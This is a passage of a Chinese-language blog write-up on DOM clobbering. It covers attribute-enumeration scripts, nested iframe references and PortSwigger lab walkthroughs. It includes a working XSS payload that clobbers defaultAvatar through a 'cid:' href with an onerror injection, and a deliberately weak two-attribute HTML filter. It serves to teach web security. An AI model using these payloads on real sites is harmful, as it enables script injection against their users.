<h5 id="4-是否自定义的DOM节点也具有上面的属性呢？"><a href="#4-是否自定义的DOM节点也具有上面的属性呢？" class="headerlink" title="4.是否自定义的DOM节点也具有上面的属性呢？"></a>4.是否自定义的DOM节点也具有上面的属性呢？</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">y</span>=<span class="string">"123"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(x.y); <span class="comment">// undefined</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="我们可以通过下面的代码来测试一下dom中有哪些属性可以用："><a href="#我们可以通过下面的代码来测试一下dom中有哪些属性可以用：" class="headerlink" title="我们可以通过下面的代码来测试一下dom中有哪些属性可以用："></a>我们可以通过下面的代码来测试一下dom中有哪些属性可以用：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>];<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">  obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<h6 id="上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码："><a href="#上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码：" class="headerlink" title="上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码："></a>上面的代码显示的是string类型的属性，他们并不一定可控，为了检查他们是否可读写，我们可以用下面的代码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [...]<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">    obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line">    <span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                DOM.innerHTML = <span class="string">'&lt;'</span>+html[i]+<span class="string">' id=x '</span>+prop+<span class="string">'=1&gt;'</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)[prop] == <span class="number">1</span>) &#123;</span><br><span class="line">                    props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<h6 id="通过上面的输出结果可以有："><a href="#通过上面的输出结果可以有：" class="headerlink" title="通过上面的输出结果可以有："></a>通过上面的输出结果可以有：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"x"</span> <span class="attr">target</span>=<span class="string">"ddd"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"y"</span> <span class="attr">download</span>=<span class="string">"eee"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(x.target); <span class="comment">// ddd</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(y.download); <span class="comment">// eee</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="对于上面的DOM属性中，我们需要关注的是username和password属性，他们是a标签的节点属性并不是html中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有-符号："><a href="#对于上面的DOM属性中，我们需要关注的是username和password属性，他们是a标签的节点属性并不是html中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有-符号：" class="headerlink" title="对于上面的DOM属性中，我们需要关注的是username和password属性，他们是a标签的节点属性并不是html中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有@符号："></a>对于上面的DOM属性中，我们需要关注的是<code>username</code>和<code>password</code>属性，他们是<code>a</code>标签的节点属性并不是<code>html</code>中定义的属性，这两个属性可以通过url的中的username字段和password字段提供，但是需要有@符号：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"ftp:Clobbered-username:Clobbered-Password@a"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>     </span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(x.username); <span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(x.password); <span class="comment">//Clobbered-password</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="上面不仅可以用ftp协议，也可以用http协议-必须加-，需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc-lt-gt-："><a href="#上面不仅可以用ftp协议，也可以用http协议-必须加-，需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc-lt-gt-：" class="headerlink" title="上面不仅可以用ftp协议，也可以用http协议(必须加//)，需要注意的是，如果我们直接通过toString函数将dom转换为字符串他的href是经过url编码的，不过我们可以通过一个不存在的协议绕过abc:&lt;&gt;："></a>上面不仅可以用<code>ftp</code>协议，也可以用<code>http</code>协议(必须加<code>//</code>)，需要注意的是，如果我们直接通过<code>toString</code>函数将dom转换为字符串他的<code>href</code>是经过url编码的，不过我们可以通过一个不存在的协议绕过<code>abc:&lt;&gt;</code>：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"abc:&lt;&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>     </span><br><span class="line"><span class="javascript">    alert(x); <span class="comment">//abc:&lt;&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="5-获取3级以上的对象引用"><a href="#5-获取3级以上的对象引用" class="headerlink" title="5.获取3级以上的对象引用"></a>5.获取3级以上的对象引用</h5><h6 id="Terjanq提到，可以结合iframe的srcdoc属性构造任意层数的对象引用。"><a href="#Terjanq提到，可以结合iframe的srcdoc属性构造任意层数的对象引用。" class="headerlink" title="@Terjanq提到，可以结合iframe的srcdoc属性构造任意层数的对象引用。"></a><a href="https://twitter.com/terjanq" target="_blank" rel="noopener">@Terjanq</a>提到，可以结合<code>iframe</code>的<code>srcdoc</code>属性构造任意层数的对象引用。</h6><h6 id="例子如下："><a href="#例子如下：" class="headerlink" title="例子如下："></a>例子如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(a.b.c.d),<span class="number">500</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="上面用到了setTimeout设置一个定时器是为了保证iframe框架的加载完成。我们可以利用style-link来加载外部样式表来造成延迟："><a href="#上面用到了setTimeout设置一个定时器是为了保证iframe框架的加载完成。我们可以利用style-link来加载外部样式表来造成延迟：" class="headerlink" title="上面用到了setTimeout设置一个定时器是为了保证iframe框架的加载完成。我们可以利用style/link来加载外部样式表来造成延迟："></a>上面用到了<code>setTimeout</code>设置一个定时器是为了保证<code>iframe</code>框架的加载完成。我们可以利用<code>style/link</code>来加载外部样式表来造成延迟：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">@<span class="keyword">import</span> <span class="string">'//portswigger.net'</span>;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="0x06-攻击实例："><a href="#0x06-攻击实例：" class="headerlink" title="0x06 攻击实例："></a>0x06 攻击实例：</h4><h5 id="1-clobbering-to-enable-XSS-lab"><a href="#1-clobbering-to-enable-XSS-lab" class="headerlink" title="1.clobbering to enable XSS lab"></a>1.<a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering" target="_blank" rel="noopener">clobbering to enable XSS lab</a></h5><h6 id="实验之前先看一个简单的例子："><a href="#实验之前先看一个简单的例子：" class="headerlink" title="实验之前先看一个简单的例子："></a>实验之前先看一个简单的例子：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span> <span class="attr">name</span>=<span class="string">url</span> <span class="attr">href</span>=<span class="string">"./xss.js"</span>&gt;</span> <span class="comment">&lt;!--xss.js alert(1)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> someObject = <span class="built_in">window</span>.someObject || &#123;&#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line">        script.src = someObject.url;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(script);</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="这个实验就有点类似下面这个例子："><a href="#这个实验就有点类似下面这个例子：" class="headerlink" title="这个实验就有点类似下面这个例子："></a>这个实验就有点类似下面这个例子：</h6><h6 id="通过查看源代码我们可以看到这个文件：loadCommentsWithDomClobbering-js，我们可以看到下面的获取图片src的代码："><a href="#通过查看源代码我们可以看到这个文件：loadCommentsWithDomClobbering-js，我们可以看到下面的获取图片src的代码：" class="headerlink" title="通过查看源代码我们可以看到这个文件：loadCommentsWithDomClobbering.js，我们可以看到下面的获取图片src的代码："></a>通过查看源代码我们可以看到这个文件：<a href="https://ac8c1f921ebb103480b5163d00e00082.web-security-academy.net/resources/js/loadCommentsWithDomClobbering.js" target="_blank" rel="noopener">loadCommentsWithDomClobbering.js</a>，我们可以看到下面的获取图片<code>src</code>的代码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> defaultAvatar = <span class="built_in">window</span>.defaultAvatar || &#123;<span class="attr">avatar</span>: <span class="string">'/resources/images/avatarDefault.svg'</span>&#125;</span><br><span class="line"><span class="keyword">let</span> avatarImgHTML = <span class="string">'&lt;img class="avatar" src="'</span> + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + <span class="string">'"&gt;'</span>;</span><br><span class="line"><span class="keyword">let</span> divImgContainer = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">divImgContainer.innerHTML = avatarImgHTML</span><br></pre></td></tr></table></figure>

<h6 id="avatar的默认值是-resources-images-avatarDefault-svg，我们可以通过覆盖window-defaultAvatar来实现xss，构造的payload如下："><a href="#avatar的默认值是-resources-images-avatarDefault-svg，我们可以通过覆盖window-defaultAvatar来实现xss，构造的payload如下：" class="headerlink" title="avatar的默认值是/resources/images/avatarDefault.svg，我们可以通过覆盖window.defaultAvatar来实现xss，构造的payload如下："></a><code>avatar</code>的默认值是<code>/resources/images/avatarDefault.svg</code>，我们可以通过覆盖<code>window.defaultAvatar</code>来实现xss，构造的payload如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">defaultAvatar</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">defaultAvatar</span> <span class="attr">name</span>=<span class="string">avatar</span> <span class="attr">href</span>=<span class="string">"cid:&amp;quot;onerror=alert(1)//"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="插入的标签如下："><a href="#插入的标签如下：" class="headerlink" title="插入的标签如下："></a>插入的标签如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"defaultAvatar"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"cid:&amp;quot;onerror=alert(1)//"</span> <span class="attr">name</span>=<span class="string">"avatar"</span> <span class="attr">id</span>=<span class="string">"defaultAvatar"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="为什么我们要把闭合前面的-quot-编码为-amp-quot-，因为cid是没有这个协议的，因此不会对-quot-进行url编码。这样在解码时-amp-quot-就变成了控制字符-quot-改变页面结构。"><a href="#为什么我们要把闭合前面的-quot-编码为-amp-quot-，因为cid是没有这个协议的，因此不会对-quot-进行url编码。这样在解码时-amp-quot-就变成了控制字符-quot-改变页面结构。" class="headerlink" title="为什么我们要把闭合前面的&quot;编码为&amp;quot;，因为cid是没有这个协议的，因此不会对&quot;进行url编码。这样在解码时&amp;quot;就变成了控制字符&quot;改变页面结构。"></a>为什么我们要把闭合前面的<code>&quot;</code>编码为<code>&amp;quot;</code>，因为<code>cid</code>是没有这个协议的，因此不会对<code>&quot;</code>进行url编码。这样在解码时<code>&amp;quot;</code>就变成了控制字符<code>&quot;</code>改变页面结构。</h6><h6 id="然后再评论一次，刷新全局变量，加载loadCommentsWithDomClobbering-js即可导致xss。"><a href="#然后再评论一次，刷新全局变量，加载loadCommentsWithDomClobbering-js即可导致xss。" class="headerlink" title="然后再评论一次，刷新全局变量，加载loadCommentsWithDomClobbering.js即可导致xss。"></a>然后再评论一次，刷新全局变量，加载<code>loadCommentsWithDomClobbering.js</code>即可导致xss。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-3-11-DOM-Clobbering-Attack-4.PNG" alt></p>
<h5 id="2-Clobbering-attributes-lab"><a href="#2-Clobbering-attributes-lab" class="headerlink" title="2.Clobbering attributes lab"></a>2.<a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters" target="_blank" rel="noopener">Clobbering attributes lab</a></h5><h6 id="实验之前我们先来看一个例子："><a href="#实验之前我们先来看一个例子：" class="headerlink" title="实验之前我们先来看一个例子："></a>实验之前我们先来看一个例子：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Clobbering Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表单，用于提交payload --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"form1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"payload"</span> <span class="attr">style</span>=<span class="string">"width: 500px;height:60px;"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">formSubmit()</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 遍历DOM树，不需要关注这个函数</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">DomBFS</span>(<span class="params">element, callback</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> queue = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span>(element) &#123;</span></span><br><span class="line">            callback(element);</span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(element.children.length !== <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; element.children.length; i++) &#123;</span></span><br><span class="line">                    queue.push(element.children[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            element = queue.shift();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 过滤用户提交的HTML代码，如果包含onclick, onerror，删掉该属性(attribute)</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> blockAttributes = [<span class="string">"onclick"</span>, <span class="string">"onerror"</span>];</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">formSubmit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> f = <span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> sandbox = <span class="built_in">document</span>.implementation.createHTMLDocument(<span class="string">''</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> root = sandbox.createElement(<span class="string">"div"</span>);</span></span><br><span class="line">        root.innerHTML = f.payload.value;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        DomBFS(root, <span class="function"><span class="keyword">function</span>(<span class="params">element</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 遍历属性名</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; element.attributes.length; a+=<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> attr = element.attributes[a];</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(blockAttributes.indexOf(attr.name) != <span class="number">-1</span>) &#123;</span></span><br><span class="line">                    element.removeAttribute(attr.name);</span><br><span class="line">                    a -= 1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(root);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

